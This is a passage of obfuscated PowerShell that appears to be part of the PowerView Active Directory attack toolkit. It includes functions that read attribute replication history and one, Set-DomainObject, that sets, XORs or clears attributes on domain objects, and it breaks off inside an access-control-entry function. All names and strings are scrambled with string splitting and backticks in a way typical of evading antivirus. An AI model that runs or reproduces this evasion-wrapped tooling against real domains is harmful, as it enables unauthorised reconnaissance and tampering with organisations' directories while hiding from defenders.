        [ValidateSet({"{1}{0}" -f 'e','Bas'}, {"{1}{2}{0}" -f'l','O','neLeve'}, {"{1}{0}{2}"-f 'btre','Su','e'})]
        [String]
        ${Sea`RCHScO`pE} = ("{2}{1}{0}"-f'ee','tr','Sub'),

        [ValidateRange(1, 10000)]
        [Int]
        ${r`eSulTP`Ag`e`SiZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${S`ErvERtime`Lim`It},

        [Switch]
        ${t`OmB`StonE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cR`ED`Ent`IaL} =   (  DIR VArIABLE:0DSqr).VaLue::"EmP`TY",

        [Switch]
        ${R`Aw}
    )

    BEGIN {
        ${Se`AR`C`H`ERa`RGUMenTs} = @{
            ("{2}{1}{0}"-f's','ie','Propert')    =   ("{3}{1}{2}{5}{7}{0}{6}{4}" -f'tada','ttri','bu','msds-repla','a','tem','t','e'),("{3}{1}{0}{2}"-f'ng','isti','uishedname','d')
            'Raw'           =   ${T`RUe}
        }
        if (${PsBOUndPa`R`A`MEters}[("{0}{1}" -f'Domai','n')]) { ${SeaRc`He`Rar`G`UME`NTs}[("{1}{2}{0}"-f'n','Dom','ai')] = ${D`O`MAIN} }
        if (${p`S`BoUndPaRaMeT`ers}[("{2}{0}{1}"-f'P','Filter','LDA')]) { ${SeA`R`ch`eRa`Rg`UmenTS}[("{2}{0}{1}" -f'PF','ilter','LDA')] = ${l`D`A`pFilTeR} }
        if (${P`sBOu`NDpAr`AM`et`Ers}[("{2}{1}{0}"-f'hBase','earc','S')]) { ${Se`ArCheRA`Rgu`MeN`Ts}[("{0}{1}{2}"-f 'S','ear','chBase')] = ${SE`ARcHB`A`SE} }
        if (${p`SbOuN`Dpa`RAMe`TE`Rs}[("{1}{0}" -f'ver','Ser')]) { ${sE`A`RCH`ERaRG`UmEnts}[("{1}{0}"-f'ver','Ser')] = ${Se`Rv`ER} }
        if (${PS`BoUnD`p`ArAMe`TErs}[("{0}{2}{3}{1}"-f'Sea','pe','rchS','co')]) { ${SeaRCHEr`A`Rgu`menTS}[("{0}{2}{1}" -f 'SearchS','ope','c')] = ${S`EAr`chscoPE} }
        if (${pSbO`U`N`dpAramEterS}[("{2}{1}{0}" -f 'ze','Si','ResultPage')]) { ${seARCH`eRaRgu`MEN`TS}[("{4}{3}{0}{2}{1}"-f'sul','PageSize','t','e','R')] = ${R`ES`U`L`TPagESiZE} }
        if (${PSb`oUNDP`AR`A`meteRS}[("{2}{0}{4}{3}{1}"-f 'erverTi','it','S','im','meL')]) { ${sEARc`HERa`RGu`MEnTs}[("{3}{0}{1}{2}" -f'erTime','Lim','it','Serv')] = ${ServeR`TIM`eLI`m`IT} }
        if (${PSbOUN`Dpa`RamEt`E`Rs}[("{2}{0}{1}" -f 'mbston','e','To')]) { ${sEa`RcH`ErArGuM`En`Ts}[("{0}{3}{1}{2}" -f'T','st','one','omb')] = ${TOm`B`Sto`Ne} }
        if (${psB`OUnDp`ARa`mE`Te`RS}[("{1}{0}"-f'e','FindOn')]) { ${Sear`Ch`e`RArGumeNtS}[("{0}{2}{1}" -f'F','ndOne','i')] = ${fin`DONe} }
        if (${PSBO`U`NdpARam`E`TErs}[("{1}{2}{0}" -f 'tial','Crede','n')]) { ${seaRC`h`eRargUme`N`Ts}[("{2}{3}{0}{1}" -f 'a','l','C','redenti')] = ${cR`E`dENTi`Al} }

        if (${PsBo`U`NdP`Ara`mETErS}[("{0}{1}{2}{3}" -f'P','roperti','e','s')]) {
            ${pRo`pEr`TYfI`LteR} = ${p`sBO`U`NdpaR`AmeTeRS}[("{1}{0}{2}{3}" -f 'r','Prope','t','ies')] -Join '|'
        }
        else {
            ${pRope`Rty`Fi`ltEr} = ''
        }
    }

    PROCESS {
        if (${PSb`oU`NdpaRA`mEt`ErS}[("{1}{2}{0}" -f 'ity','Iden','t')]) { ${seARChEr`ArG`UmEn`TS}[("{0}{1}{2}"-f 'Ide','ntit','y')] = ${IDe`Nt`ITY} }

        &("{4}{3}{2}{0}{1}"-f 'bjec','t','mainO','-Do','Get') @SearcherArguments | &("{2}{0}{3}{1}{4}"-f'orEach','je','F','-Ob','ct') {
            ${ob`Jec`TdN} = ${_}."prOp`eR`TieS"[("{2}{1}{0}{3}{4}" -f 'i','t','dis','nguish','edname')][0]
            ForEach(${X`MlNo`De} in ${_}."pRope`RT`IES"[("{2}{5}{3}{0}{1}{4}"-f 'i','bu','msds-r','plattr','temetadata','e')]) {
                ${tEM`Po`BJeCT} = [xml]${XmLN`ode} | &("{3}{0}{1}{2}"-f 'c','t-O','bject','Sele') -ExpandProperty ("{1}{2}{4}{0}{3}"-f 'E','DS_REP','L_ATT','TA_DATA','R_M') -ErrorAction ("{0}{4}{3}{2}{1}"-f'Sil','ue','yContin','ntl','e')
                if (${tem`PoB`JecT}) {
                    if (${T`EM`pO`BjECt}."P`sZaTtribuT`ENA`ME" -Match ${P`ROpe`RT`Y`FILTER}) {
                        ${oU`TpUt} = &("{2}{1}{3}{0}" -f't','Ob','New-','jec') ("{0}{2}{1}" -f'PSObj','ct','e')
                        ${O`UTpUT} | &("{1}{2}{0}"-f'Member','A','dd-') ("{1}{0}{2}"-f'ert','NoteProp','y') ("{2}{0}{1}"-f'tD','N','Objec') ${oBjEC`T`dn}
                        ${oUt`pUT} | &("{0}{2}{1}" -f'Ad','Member','d-') ("{1}{2}{0}" -f 'roperty','Note','P') ("{2}{0}{1}"-f'ttr','ibuteName','A') ${T`EMpo`BJecT}."psz`AtTrIb`Ute`NamE"
                        ${oU`T`puT} | &("{2}{0}{1}"-f'-Mem','ber','Add') ("{1}{2}{3}{0}"-f'perty','N','ote','Pro') ("{2}{1}{0}{5}{3}{4}" -f 'gi','tOri','Las','ingC','hange','nat') ${t`EMPoBJ`ect}."FT`IMEL`A`sT`ORIgiNA`T`INGChAN`GE"
                        ${OU`TP`Ut} | &("{1}{0}{2}" -f'embe','Add-M','r') ("{2}{1}{3}{0}"-f 'ty','ro','NoteP','per') ("{1}{0}" -f 'n','Versio') ${teMpOBJ`E`ct}."dw`VeR`sIoN"
                        ${Ou`TPUT} | &("{0}{2}{1}" -f'Ad','ber','d-Mem') ("{2}{1}{0}"-f 'erty','Prop','Note') ("{0}{4}{2}{3}{1}" -f'LastO','N','atin','gDsaD','rigin') ${t`Em`pob`jecT}."PSZ`laS`ToriGi`NatIn`GDS`ADn"
                        ${o`U`Tput}."pS`obJ`ect"."Ty`peNA`meS".("{0}{2}{1}"-f'I','sert','n').Invoke(0, ("{1}{6}{0}{4}{5}{2}{3}"-f'View.AD','Po','ut','eHistory','ObjectAtt','rib','wer'))
                        ${OUtp`Ut}
                    }
                }
                else {
                    &("{1}{3}{2}{0}"-f'e','Wri','bos','te-Ver') ('[Get-'+'Dom'+'ainObjectA'+'ttrib'+'ut'+'eHistor'+'y'+']'+' '+'Er'+'r'+'or '+'re'+'tr'+'iev'+'ing '+('{0}'+'ms'+'ds-'+'replat'+'t'+'ribute'+'m'+'et'+'adata{'+'0} ')  -f  [chAR]39+'f'+'or '+"'$ObjectDN'")
                }
            }
        }
    }
}


function g`Et-DOmAIn`oBJeC`Tl`inkeDa`Ttri`BU`TeHiSTORy {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{3}{1}{7}{4}{5}{6}{0}" -f 'gnments','Use','P','S','ared','V','arsMoreThanAssi','Decl'}, '')]
    [OutputType({"{3}{0}{7}{1}{5}{2}{4}{6}" -f'View.ADO','Linke','Hi','Power','st','dAttribute','ory','bject'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOsITION = 0, valuEFrOMpIpeLINE = ${T`Rue}, VALUEFROMPIpELiNebYprOpeRtynAME = ${t`RuE})]
        [Alias({"{3}{1}{2}{0}"-f 'ame','tinguishe','dN','Dis'}, {"{2}{0}{3}{1}" -f'am','me','S','AccountNa'}, {"{0}{1}"-f 'N','ame'}, {"{3}{0}{4}{1}{5}{2}{6}" -f 'mb','gui','dNam','Me','erDistin','she','e'}, {"{1}{0}{2}"-f 'mberN','Me','ame'})]
        [String[]]
        ${iD`ENT`ITy},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`OMA`IN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f 'Filt','er'})]
        [String]
        ${Ld`Apf`I`lTer},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${Pr`opeR`T`IEs},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}" -f 'DS','Path','A'})]
        [String]
        ${sE`A`RCHBaSe},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{4}{3}{1}"-f 'ma','r','Do','nControlle','i'})]
        [String]
        ${SeRV`er},

        [ValidateSet({"{0}{1}" -f'B','ase'}, {"{0}{2}{1}"-f 'OneL','l','eve'}, {"{2}{1}{0}" -f 'ee','ubtr','S'})]
        [String]
        ${SeAr`CHsC`oPe} = ("{0}{1}{2}" -f'Su','btr','ee'),

        [ValidateRange(1, 10000)]
        [Int]
        ${RESUL`TP`A`GeSi`ZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${se`RvE`Rti`mElim`It},

        [Switch]
        ${to`MBsTo`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cr`edeNtI`AL} =  $0dSQR::"Em`ptY",

        [Switch]
        ${R`AW}
    )

    BEGIN {
        ${sEa`RCH`eRarg`U`mEn`Ts} = @{
            ("{0}{2}{1}" -f 'Pro','es','perti')    =   ("{1}{4}{2}{3}{0}" -f'tadata','ms','replva','lueme','ds-'),("{4}{1}{3}{2}{0}" -f 'e','tingui','m','shedna','dis')
            'Raw'           =   ${t`RuE}
        }
        if (${pSb`ouNDpar`AM`Et`eRs}[("{1}{0}{2}"-f 'ai','Dom','n')]) { ${Sea`R`c`HE`RaRG`UmeNTs}[("{1}{0}"-f 'n','Domai')] = ${d`oMAIN} }
        if (${P`SBo`UndparaM`eters}[("{2}{1}{0}" -f'lter','PFi','LDA')]) { ${SEArchE`RAr`gu`M`enTs}[("{1}{0}{2}"-f'DAPFilt','L','er')] = ${lD`AP`Fil`Ter} }
        if (${PsBoUndpAR`AM`E`TE`RS}[("{2}{0}{1}"-f'rchBas','e','Sea')]) { ${SeARcHEr`A`R`Gu`mEntS}[("{3}{1}{0}{2}"-f 'hB','earc','ase','S')] = ${S`e`ArCH`Base} }
        if (${Psb`o`UnD`PaRA`mETerS}[("{1}{0}"-f'ver','Ser')]) { ${Se`ARC`heRARg`UM`enTs}[("{0}{1}" -f 'Ser','ver')] = ${S`e`Rver} }
        if (${psBOUndPA`Ra`m`EtERS}[("{0}{2}{1}" -f 'SearchS','ope','c')]) { ${s`E`AR`ChERar`G`UMeNts}[("{2}{0}{1}" -f'rchSc','ope','Sea')] = ${se`A`R`ChscOpE} }
        if (${P`SbOuNDPar`A`meTE`Rs}[("{3}{2}{1}{0}"-f'ze','PageSi','sult','Re')]) { ${se`AR`CHe`RargUme`NTs}[("{2}{0}{1}"-f 'esultPa','geSize','R')] = ${ReS`UlTp`AgesIze} }
        if (${pSB`ouNDPAR`A`Met`erS}[("{0}{4}{2}{1}{3}"-f'Ser','im','L','it','verTime')]) { ${seA`R`CHe`RAR`G`UMENTS}[("{0}{2}{1}{3}" -f'Server','e','Tim','Limit')] = ${S`erveR`TiMelI`mIt} }
        if (${PsboundP`ARAm`E`T`ErS}[("{0}{1}{2}{3}" -f 'Tombst','o','n','e')]) { ${seaRch`eRAr`G`UmEnTS}[("{2}{0}{1}"-f 'b','stone','Tom')] = ${tOM`BS`TONe} }
        if (${P`sBou`NDparaME`TERS}[("{2}{0}{1}"-f'enti','al','Cred')]) { ${S`ea`RChEr`ArGu`MEN`TS}[("{1}{2}{0}" -f'dential','Cr','e')] = ${Cr`EDEN`TIAL} }

        if (${p`Sbo`UndpaRa`mEteRs}[("{1}{2}{0}"-f 'rties','Prop','e')]) {
            ${PR`opeRTY`F`i`Lter} = ${p`sBOUndP`A`R`A`MEterS}[("{2}{0}{1}"-f'er','ties','Prop')] -Join '|'
        }
        else {
            ${Pr`OpERtyfi`lT`ER} = ''
        }
    }

    PROCESS {
        if (${ps`B`ouNdp`Ara`mETE`RS}[("{1}{0}{2}"-f 'i','Ident','ty')]) { ${Se`Arch`ErarguM`enTs}[("{0}{1}{2}"-f'Iden','ti','ty')] = ${iDEn`T`ITY} }

        &("{1}{4}{0}{3}{2}"-f 'mainObje','Get-D','t','c','o') @SearcherArguments | &("{0}{3}{2}{1}" -f'F','Object','Each-','or') {
            ${o`BjECT`DN} = ${_}."Pr`O`PertIES"[("{4}{0}{3}{2}{1}" -f'stingu','ame','edn','ish','di')][0]
            ForEach(${xmL`NOde} in ${_}."p`ROperT`iES"[("{2}{0}{4}{5}{6}{1}{3}"-f 's-replv','ad','msd','ata','al','uem','et')]) {
                ${tEm`PoB`J`Ect} = [xml]${x`mLNo`de} | &("{2}{1}{0}{3}"-f'c','elect-Obje','S','t') -ExpandProperty ("{2}{0}{4}{1}{3}"-f '_R','ETA_','DS','DATA','EPL_VALUE_M') -ErrorAction ("{1}{3}{2}{0}{4}"-f 'onti','S','lentlyC','i','nue')
                if (${Te`Mp`oB`ject}) {
                    if (${Tem`pob`jE`Ct}."pSz`AT`T`R`ibuTEName" -Match ${pr`OPer`TyfiLt`er}) {
                        ${OUt`P`UT} = &("{0}{1}{2}"-f'N','ew-','Object') ("{1}{0}{2}" -f'SObjec','P','t')
                        ${oUT`PUt} | &("{1}{2}{0}"-f'ember','Ad','d-M') ("{1}{2}{0}" -f'ty','Not','eProper') ("{1}{2}{0}" -f'tDN','O','bjec') ${Obje`c`TDN}
                        ${O`U`TPUT} | &("{0}{1}{3}{2}"-f 'Add-Me','mb','r','e') ("{2}{1}{0}" -f'erty','op','NotePr') ("{2}{0}{1}"-f 't','tributeName','A') ${TE`mPOb`J`ECT}."pS`zAt`T`R`IBUTEnaMe"
                        ${O`UTp`Ut} | &("{0}{2}{1}" -f 'Add','mber','-Me') ("{2}{0}{1}" -f 'otePropert','y','N') ("{1}{4}{0}{3}{2}" -f 'ute','Attr','lue','Va','ib') ${TeM`pOb`jeCt}."psZobj`E`CTdN"
                        ${O`U`TpUT} | &("{2}{1}{0}"-f'r','embe','Add-M') ("{0}{3}{2}{1}"-f'NoteP','ty','r','rope') ("{2}{1}{0}" -f 'Created','e','Tim') ${TeM`po`BjecT}."f`TIMeCr`Ea`TEd"
                        ${O`Utp`Ut} | &("{2}{1}{0}"-f 'ber','-Mem','Add') ("{0}{2}{3}{1}" -f 'Note','rty','Prop','e') ("{0}{3}{2}{1}" -f 'T','d','Delete','ime') ${Te`m`P`oBJEct}."fTiMede`l`ETEd"
                        ${o`UTpuT} | &("{2}{1}{0}"-f'mber','e','Add-M') ("{2}{3}{1}{0}"-f'y','ert','N','oteProp') ("{5}{2}{1}{4}{0}{3}"-f'n','h','ngC','ge','a','LastOriginati') ${temPob`J`ect}."F`TimELASTOR`I`GIna`TiNGchangE"
                        ${O`UtpUT} | &("{0}{2}{3}{1}"-f 'Ad','er','d-M','emb') ("{2}{1}{0}"-f 'rty','rope','NoteP') ("{1}{0}"-f 'ersion','V') ${t`EMpoBJ`ecT}."d`wVE`RSioN"
                        ${Ou`TPuT} | &("{1}{0}{2}"-f'-Membe','Add','r') ("{1}{2}{3}{0}"-f'erty','Note','Pro','p') ("{0}{1}{5}{2}{4}{3}" -f 'L','astO','inat','saDN','ingD','rig') ${T`Em`Pobje`CT}."PSZlast`oRiG`INA`TINGD`sADN"
                        ${ou`Tp`Ut}."psO`BJe`CT"."tY`pe`NAmeS".("{0}{1}"-f 'I','nsert').Invoke(0, ("{2}{5}{7}{6}{1}{9}{8}{10}{3}{4}{0}"-f'istory','.ADOb','P','ut','eH','owerV','w','ie','tLinkedAtt','jec','rib'))
                        ${ou`T`PUT}
                    }
                }
                else {
                    &("{0}{1}{3}{2}"-f'W','rite-V','e','erbos') ('[Get'+'-Do'+'m'+'ainObjectL'+'ink'+'edAt'+'trib'+'ute'+'Hi'+'stor'+'y] '+'Er'+'ror'+' '+'retrievi'+'n'+'g'+' '+('{'+'0}m'+'sds'+'-rep'+'l'+'v'+'aluemetadat'+'a{0} ')-f [CHAR]39+'fo'+'r '+"'$ObjectDN'")
                }
            }
        }
    }
}


function set-doM`AI`N`ObjEct {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{6}{10}{0}{12}{8}{1}{11}{7}{5}{2}{4}{3}{9}"-f'Shoul','ForS','ChangingFun','io','ct','te','PSU','a','rocess','ns','se','t','dP'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{1}{3}{0}" -f'dProcess','Sho','PS','ul'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(PoSiTioN = 0, MAndatOry = ${Tr`UE}, VALuEFrOmPiPEline = ${T`RUe}, vALuefrOMpIPELInEByPRoPeRtyNAmE = ${t`RUe})]
        [Alias({"{3}{2}{1}{4}{0}"-f'Name','uish','ng','Disti','ed'}, {"{0}{1}{2}"-f 'SamA','c','countName'}, {"{1}{0}"-f'e','Nam'})]
        [String[]]
        ${IDeN`TIty},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}" -f'R','ce','epla'})]
        [Hashtable]
        ${s`et},

        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${x`OR},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${CL`eAr},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DoM`AIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f 'Filt','er'})]
        [String]
        ${l`DaPfiL`TEr},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f 'ADS','Path'})]
        [String]
        ${SEArcH`B`ASE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{4}{2}{3}{0}"-f 'troller','Dom','i','nCon','a'})]
        [String]
        ${sE`R`VeR},

        [ValidateSet({"{1}{0}" -f 'e','Bas'}, {"{2}{1}{0}" -f'l','e','OneLev'}, {"{1}{0}"-f'e','Subtre'})]
        [String]
        ${SeaR`ch`sc`OpE} = ("{1}{0}{2}" -f'tr','Sub','ee'),

        [ValidateRange(1, 10000)]
        [Int]
        ${RE`suL`TPAgE`Si`ZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${s`ErvE`Rti`meLIM`it},

        [Switch]
        ${tOM`B`sToNe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CrE`DE`NTiAl} =  (  dIr vaRIabLe:0DSQr  ).vaLuE::"eMP`TY"
    )

    BEGIN {
        ${S`eAR`chErA`Rg`UMEn`Ts} = @{'Raw' = ${t`RUE}}
        if (${psbO`UNd`pA`RAmeTe`RS}[("{0}{1}"-f 'D','omain')]) { ${sEarCHERa`R`g`UMENTs}[("{1}{2}{0}" -f'ain','D','om')] = ${dOma`iN} }
        if (${P`sB`ouND`p`A`RaMeterS}[("{2}{1}{0}"-f'er','t','LDAPFil')]) { ${SEAR`che`RaRg`Ume`NtS}[("{2}{1}{0}" -f'ilter','APF','LD')] = ${ld`AP`FiLTER} }
        if (${PSBoUNDp`A`RAme`TE`RS}[("{1}{2}{0}" -f'hBase','Se','arc')]) { ${se`ArCheR`A`Rgum`ENtS}[("{1}{2}{0}" -f'se','Sear','chBa')] = ${se`ArC`Hb`ASe} }
        if (${PSBO`UndpARAm`etE`Rs}[("{0}{1}"-f'Se','rver')]) { ${s`EaRcH`E`RARGUmeN`TS}[("{1}{2}{0}"-f 'r','Ser','ve')] = ${sE`RV`Er} }
        if (${PsBOU`ND`pArAM`ETeRs}[("{1}{0}{2}"-f 'hSco','Searc','pe')]) { ${SEA`RC`he`Rar`GUMe`NTS}[("{1}{2}{0}"-f 'cope','S','earchS')] = ${SEA`RCH`S`coPe} }
        if (${p`SBO`UnDp`A`RaMe`Ters}[("{2}{3}{1}{0}" -f 'ageSize','sultP','R','e')]) { ${S`E`ArCher`Ar`GUMeNts}[("{1}{0}{3}{2}"-f 'tPage','Resul','e','Siz')] = ${r`ES`Ult`pagE`sIze} }
        if (${PsBo`UnDparaM`E`TE`Rs}[("{2}{0}{1}"-f 'Lim','it','ServerTime')]) { ${sEa`R`cheR`ARGUM`eNtS}[("{3}{2}{0}{4}{1}" -f'ver','meLimit','r','Se','Ti')] = ${SERv`e`Rti`MElI`mit} }
        if (${pSBOundPA`RA`MEte`RS}[("{2}{0}{1}" -f 'bsto','ne','Tom')]) { ${SeA`Rch`erarg`UM`eNTS}[("{0}{2}{1}"-f 'T','one','ombst')] = ${TO`mbSTo`NE} }
        if (${psb`oUNdpA`Ram`Ete`Rs}[("{2}{3}{1}{0}"-f'ential','ed','C','r')]) { ${Se`AR`CHErARGuME`NTs}[("{3}{0}{1}{2}" -f'e','n','tial','Cred')] = ${CRE`d`En`TiaL} }
    }

    PROCESS {
        if (${P`sBOuN`Dp`Ar`AM`etErS}[("{0}{1}" -f'Identi','ty')]) { ${SEa`RChe`RargUm`enTS}[("{2}{1}{0}"-f'ity','dent','I')] = ${iden`Tity} }

        
        ${RAw`obJ`eCt} = &("{3}{0}{5}{2}{1}{4}"-f'-','nObj','ai','Get','ect','Dom') @SearcherArguments

        ForEach (${o`BJEcT} in ${RAWO`BJe`CT}) {

            ${EN`TRy} = ${rAWo`Bje`cT}.("{0}{1}{3}{2}" -f'GetDire','ctor','Entry','y').Invoke()

            if(${pSbO`U`Nd`P`AramETeRS}['Set']) {
                try {
                    ${ps`B`oUNDPARa`MET`Ers}['Set'].("{1}{0}{2}"-f'erat','GetEnum','or').Invoke() | &("{3}{1}{2}{0}"-f'bject','c','h-O','ForEa') {
                        &("{4}{2}{3}{0}{1}"-f'bo','se','rite-V','er','W') "[Set-DomainObject] Setting '$($_.Name)' to '$($_.Value)' for object '$($RawObject.Properties.samaccountname)' "
                        ${enT`Ry}.("{0}{1}"-f 'p','ut').Invoke(${_}."n`AMe", ${_}."V`ALuE")
                    }
                    ${E`NtrY}.("{1}{0}{3}{2}"-f 'chan','commit','s','ge').Invoke()
                }
                catch {
                    &("{2}{0}{3}{1}"-f 'r','g','W','ite-Warnin') "[Set-DomainObject] Error setting/replacing properties for object '$($RawObject.Properties.samaccountname)' : $_ "
                }
            }
            if(${pS`BoUNDPARAMEt`E`RS}['XOR']) {
                try {
                    ${pSBouND`PaRame`T`ers}['XOR'].("{0}{2}{1}" -f 'GetEn','erator','um').Invoke() | &("{2}{4}{1}{0}{3}" -f'e','h-Obj','F','ct','orEac') {
                        ${prO`PERt`y`Name} = ${_}."n`AMe"
                        ${P`Rop`erTY`XoRV`Al`Ue} = ${_}."VA`LUE"
                        &("{2}{1}{0}{3}" -f 'e-Verbo','t','Wri','se') "[Set-DomainObject] XORing '$PropertyName' with '$PropertyXorValue' for object '$($RawObject.Properties.samaccountname)' "
                        ${t`Ype`NAme} = ${e`N`TRY}.${proP`Ert`YN`AME}[0].("{2}{1}{0}"-f 'pe','tTy','Ge').Invoke()."NA`mE"

                        
                        ${pRo`p`erty`VAlUe} = $(${E`NtrY}.${p`ROp`eRt`Yna`me}) -bxor ${ProPe`Rty`X`O`RvalUE}
                        ${E`Ntry}.${pr`opeR`TYn`AmE} = ${P`ROPER`T`YVaLuE} -as ${TYPena`mE}
                    }
                    ${EN`T`RY}.("{0}{2}{1}" -f 'commi','nges','tcha').Invoke()
                }
                catch {
                    &("{2}{1}{0}{3}{4}"-f'rni','ite-Wa','Wr','n','g') "[Set-DomainObject] Error XOR'ing properties for object '$($RawObject.Properties.samaccountname)' : $_ "
                }
            }
            if(${P`SBound`par`Am`ETerS}[("{0}{1}" -f 'C','lear')]) {
                try {
                    ${PSB`Oun`dPar`AMeTERs}[("{0}{1}" -f 'Cl','ear')] | &("{3}{0}{2}{4}{1}" -f 'rEach-','ect','O','Fo','bj') {
                        ${pR`O`PE`RTY`NAmE} = ${_}
                        &("{1}{3}{0}{2}"-f 'er','W','bose','rite-V') "[Set-DomainObject] Clearing '$PropertyName' for object '$($RawObject.Properties.samaccountname)' "
                        ${EN`T`RY}.${pR`o`PErT`y`NAMe}.("{0}{1}"-f'clea','r').Invoke()
                    }
                    ${e`N`TRy}.("{3}{2}{4}{1}{0}" -f 's','e','o','c','mmitchang').Invoke()
                }
                catch {
                    &("{2}{1}{0}"-f'ng','e-Warni','Writ') "[Set-DomainObject] Error clearing properties for object '$($RawObject.Properties.samaccountname)' : $_ "
                }
            }
        }
    }
}


function co`NverTfRoM-`LDaPlo`g`OnhO`Urs {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{6}{5}{2}{3}{4}"-f'seDe','PSU','re','ThanA','ssignments','aredVarsMo','cl'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{1}{0}"-f 'cess','o','PSShouldPr'}, '')]
    [OutputType({"{2}{5}{1}{3}{4}{0}" -f's','View.Lo','Pow','go','nHour','er'})]
    [CmdletBinding()]
    Param (
        [Parameter( VaLUEFRomPIpELinE = ${T`RUe}, VAluEfRoMPiPELinebyprOpeRTYname = ${t`RUe})]
        [ValidateNotNullOrEmpty()]
        [byte[]]
        ${logoNH`oursARR`AY}
    )

    Begin {
        if(${lO`GO`NHo`UrsarraY}."Co`UnT" -ne 21) {
            throw ("{8}{10}{3}{6}{7}{4}{0}{1}{9}{2}{5}" -f 'n','co','ct leng','on','the i','th','Hou','rsArray is ','L','rre','og')
        }

        function c`ONvERTTo-lo`Go`N`HoUrsA`RRAy {
            Param (
                [int[]]
                ${H`Ou`R`sarR}
            )

            ${LOg`o`N`HourS} = &("{2}{0}{1}"-f'-Ob','ject','New') ("{0}{1}{2}" -f 'boo','l','[]') 24
            for(${I}=0; ${i} -lt 3; ${I}++) {
                ${b`YTE} = ${hoU`RsA`RR}[${I}]
                ${O`Ff`Set} = ${i} * 8
                ${s`Tr} =  (  GEt-vAriaBLE  WTd42  -vAL)::("{2}{1}{0}"-f 'g','oStrin','T').Invoke(${B`YTE},2).("{0}{1}" -f'P','adLeft').Invoke(8,'0')

                ${Logo`NhO`UrS}[${oFF`sEt}+0] = [bool]  (geT-chILdItem ('VarI'+'A'+'blE:wT'+'D'+'42')).vAlUE::"To`I`Nt32"([string]${S`TR}[7])
                ${lO`gOnHo`URs}[${OffS`Et}+1] = [bool]   $Wtd42::"toi`Nt`32"([string]${S`TR}[6])
                ${log`O`NHO`UrS}[${Of`Fs`Et}+2] = [bool]  (  geT-Variable ("wTd"+"42") -valu )::"toI`N`T32"([string]${S`Tr}[5])
                ${lOG`ONHO`U`Rs}[${OfF`s`Et}+3] = [bool]  (Item  VARiAblE:Wtd42  ).ValUE::"t`oInt`32"([string]${S`Tr}[4])
                ${LoG`o`NhO`URs}[${o`FFs`ET}+4] = [bool]   ( iTEM  ("vARIA"+"Bl"+"e:wtD42")).VALue::"tOi`NT32"([string]${S`Tr}[3])
                ${LOGO`NhO`Urs}[${of`FS`Et}+5] = [bool]   $Wtd42::"toIn`T32"([string]${s`Tr}[2])
                ${LOG`O`NhoUrs}[${OF`Fs`et}+6] = [bool]  ( get-VArIaBLE ('wTd'+'42') ).vALuE::"tOIn`T32"([string]${S`Tr}[1])
                ${LOG`onh`oURS}[${OFfs`eT}+7] = [bool]   $wTD42::"toIN`T32"([string]${s`Tr}[0])
            }

            ${L`o`gONhOurs}
        }
    }

    Process {
        ${O`UTPUT} = @{
            ("{1}{0}" -f'y','Sunda') = &("{3}{6}{4}{5}{2}{0}{1}"-f'ra','y','ogonHoursAr','Conver','-','L','tTo') -HoursArr ${L`o`GO`N`HourSaRray}[0..2]
            ("{1}{0}" -f'nday','Mo') = &("{1}{3}{0}{2}{4}"-f 'tTo-Logon','Conv','HoursArr','er','ay') -HoursArr ${L`oGonHours`ARr`AY}[3..5]
            ("{1}{0}{2}"-f 'es','Tu','day') = &("{1}{4}{0}{2}{3}"-f 'gonHour','ConvertTo','sArra','y','-Lo') -HoursArr ${L`OGONHo`U`RsArRaY}[6..8]
            ("{1}{0}{2}" -f'sda','Wedne','y') = &("{5}{2}{4}{3}{0}{6}{1}" -f 'our','rray','onv','gonH','ertTo-Lo','C','sA') -HoursArr ${Lo`GonHO`UrSaR`RAY}[9..11]
            ("{1}{0}"-f 'rs','Thu') = &("{1}{6}{4}{3}{5}{0}{2}"-f 'Hou','Conve','rsArray','Log','tTo-','on','r') -HoursArr ${lo`gONhoU`Rs`ARRAY}[12..14]
            ("{0}{1}"-f'Fri','day') = &("{0}{7}{2}{4}{3}{6}{1}{5}" -f 'Conve','r','tTo-Logon','o','H','ray','ursA','r') -HoursArr ${LogOnhOur`s`A`R`RAY}[15..17]
            ("{2}{0}{1}"-f 'at','urday','S') = &("{0}{5}{2}{1}{7}{6}{4}{3}"-f'Co','o','g','y','ra','nvertTo-Lo','HoursAr','n') -HoursArr ${lO`go`NHO`Ur`SARRay}[18..20]
        }

        ${oU`T`puT} = &("{1}{0}{2}" -f'-Objec','New','t') ("{2}{0}{1}"-f 'SObje','ct','P') -Property ${O`U`TPUt}
        ${O`UTP`Ut}."pS`objE`cT"."t`ypENA`mEs".("{0}{1}"-f'I','nsert').Invoke(0, ("{1}{5}{2}{4}{0}{3}"-f'our','Pow','w','s','.LogonH','erVie'))
        ${o`UT`put}
    }
}


function NeW-`AD`OBJeCtAC`CEs`sCONtROl`enTRY {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{5}{0}{9}{6}{8}{2}{7}{4}{1}" -f 'n','ns','n','PSUse','io','ShouldProcessForStateCha','ingF','ct','u','g'}, '')]
